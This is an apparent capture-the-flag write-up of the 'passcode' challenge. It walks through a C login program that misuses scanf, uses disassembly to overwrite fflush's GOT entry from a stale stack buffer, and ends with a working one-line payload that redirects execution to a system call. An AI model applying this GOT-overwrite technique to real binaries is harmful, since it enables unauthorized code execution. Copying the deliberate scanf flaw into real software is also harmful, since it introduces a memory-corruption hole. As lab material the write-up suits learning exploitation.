Let's take a look at the source code.

```
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

Looking at this code, it seems like the program is straight forward. It's a login system that asks for your name, then for two passcodes. It then compares the two passcodes against 338150, and 13371337, and passes if the passcodes match. Then shouldn't we be able to input those values into the program? Why are we even looking at this?

```
passcode@ubuntu:~$ ls
flag  passcode	passcode.c
passcode@ubuntu:~$ ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : guyinatuxedo
Welcome guyinatuxedo!
enter passcode1 : 338150
Segmentation fault
```

What just happened? Let's look at the scanf that apparently crashed the program.

```
	int passcode1;
	int passcode2;

  printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);
```

So there is a glaring problem. Scanf requires an address to write to. The program gives it an int, with a value of 0. We will have to change that 0, to an actual address value so the program doesn't crash. Let's look at the function that is called before it, welcome().

```
void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}
```

As you can see, scanf has a char pointer (name) as the argument, so this implementation works. This scanf will take in 100 characters, then write them to name. Let's see where the input starts in the assembly code (you can do this using gdb, objdump, or whatever you feel like).

```
Dump of assembler code for function welcome:
   0x08048609 <+0>:	push   %ebp
   0x0804860a <+1>:	mov    %esp,%ebp
   0x0804860c <+3>:	sub    $0x88,%esp
   0x08048612 <+9>:	mov    %gs:0x14,%eax
   0x08048618 <+15>:	mov    %eax,-0xc(%ebp)
   0x0804861b <+18>:	xor    %eax,%eax
   0x0804861d <+20>:	mov    $0x80487cb,%eax
   0x08048622 <+25>:	mov    %eax,(%esp)
   0x08048625 <+28>:	call   0x8048420 <printf@plt>
   0x0804862a <+33>:	mov    $0x80487dd,%eax
=> 0x0804862f <+38>:	lea    -0x70(%ebp),%edx
   0x08048632 <+41>:	mov    %edx,0x4(%esp)
   0x08048636 <+45>:	mov    %eax,(%esp)
   0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:	mov    $0x80487e3,%eax
   0x08048643 <+58>:	lea    -0x70(%ebp),%edx
   0x08048646 <+61>:	mov    %edx,0x4(%esp)
   0x0804864a <+65>:	mov    %eax,(%esp)
   0x0804864d <+68>:	call   0x8048420 <printf@plt>
   0x08048652 <+73>:	mov    -0xc(%ebp),%eax
   0x08048655 <+76>:	xor    %gs:0x14,%eax
   0x0804865c <+83>:	je     0x8048663 <welcome+90>

```

As you can see at welcome+38, it uses the lea (load effective address) instruction to load the address of name into the ebp-0x70. We can tell that it is a paramter for the scanf, since it is right before scanf is called.
So because of this, scanf will start writing at ebp-0x70. Let's see where the passcode1 variable is stored in memory.

```
Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
=> 0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
```

So we can see at login+34, the first scanf is called. Because of that we know that the passcode1 variable has to be stored in memory before that.
If we look at login+24, we can see that a register is being moved into ebp-0x10. In my experience, ebp is usually the register to hold values such as the one we are looking for.
In addition to that, it is in the area that the paramter would need to be loaded. So because of this passcode1 is probably stored at
ebp-0x10. Now to calculate the difference between epb-0x70 and ebp-0x10.

```
0x70 - 0x10 = 96
```

So the difference between the two is 96 bytes, which since we can write 100 characters, we can reach that plus have just enough space left to write a 4 byte address so the program will actually run.
Now we are given an interesting position here. We control what the scanf function writes. We also control where it writes to. We could rewrite part of the program. This includes rewriting the address of a function, to the address of the system function, thus effictevly running the system call.

The first thing we will need is a function to overwrite. We could overwrite the fflush function, because it's immediately after the scanf and if it doesn't execute, it's not the end of the world.
To do this we will first need the address of the fflush function, so we can write to this. I'm going to do this using objdump.

```
passcode@ubuntu:~$ objdump -R passcode | grep fflush
0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
```

And there we have it, the address of the fflush function is 0x0804a004. Now we just need the address of the system function.

```
   0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
=> 0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	movl   $0x0,(%esp)
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
```

Here we can see the system function called at 0x080485ea. However we can't just jump there, because we need to have it push the parameters to it, otherwise the system call will do nothing. We can see that two lines above it at
login+122 it calls puts, and they're probably aren't any arguments before that. That leaves the one line between the two calls at login+127 to push the parameters onto the stack. So if we jump to the address 0x080485e3, it will push the necissary paramters onto the stack, then it will execute the system function. So effectively we just replaced the fflush function with the system call later on that will give us the flag.

Now to contruct the payload. Since the scanf function has the "%d" flag, we will need to pass the value that we are using it to write (0x080485e3) as it's decimal equivalent, which is 134514147.

```
passcode@ubuntu:~$ python -c 'print "0"*96 + "\x04\xa0\x04\x08" + "134514147"' | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000�!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
```
And just like that, we pwned the binary.

